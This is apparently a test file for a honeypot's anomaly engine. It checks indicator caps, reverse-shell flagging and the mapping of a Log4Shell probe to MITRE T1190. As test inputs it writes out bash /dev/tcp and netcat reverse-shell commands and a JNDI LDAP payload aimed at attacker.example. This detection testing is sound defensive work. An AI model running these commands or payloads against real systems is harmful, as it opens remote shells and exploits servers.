"""v2.3.0 anomaly engine tests: indicator cap and MITRE additions."""

from __future__ import annotations

from baitbox.anomaly import (
    MITRE_TECHNIQUES,
    _MAX_INDICATORS_PER_IP,
    analyze_event,
    get_threat_score,
    reset_metrics,
)


def test_matched_indicators_are_capped():
    reset_metrics()
    ip = "203.0.113.120"
    for _ in range(60):
        analyze_event({
            "src_ip": ip,
            "protocol": "SSH",
            "event_type": "command",
            "payload": {"command": "bash -i >& /dev/tcp/10.0.0.9/4444 0>&1"},
        })
    metrics = get_threat_score(ip)
    # Indicators never exceed the per-IP cap
    assert len(metrics["indicators"]) <= _MAX_INDICATORS_PER_IP
    assert _MAX_INDICATORS_PER_IP == 20
    reset_metrics()


def test_reverse_shell_command_flags_category():
    reset_metrics()
    ip = "203.0.113.121"
    analyze_event({
        "src_ip": ip,
        "protocol": "SSH",
        "event_type": "command",
        "payload": {"command": "nc -e /bin/sh 10.0.0.9 4444"},
    })
    score = get_threat_score(ip)
    assert "REVERSE_SHELL" in score["attack_categories"]
    assert score["threat_level"] in ("MEDIUM", "CRITICAL")
    reset_metrics()


def test_log4shell_probe_maps_to_t1190():
    reset_metrics()
    ip = "203.0.113.122"
    analyze_event({
        "src_ip": ip,
        "protocol": "HTTP",
        "event_type": "request",
        "payload": {
            "path": "/api/search",
            "query": "q=${jndi:ldap://attacker.example/a}",
            "body": "",
        },
    })
    score = get_threat_score(ip)
    assert "T1190" in score["mitre_techniques"]
    assert "EXPLOIT" in score["attack_categories"]
    reset_metrics()


def test_mitre_catalog_contains_core_techniques():
    required = {"T1059.004", "T1078", "T1496", "T1190", "T1552.001", "T1548.003"}
    assert required.issubset(set(MITRE_TECHNIQUES))
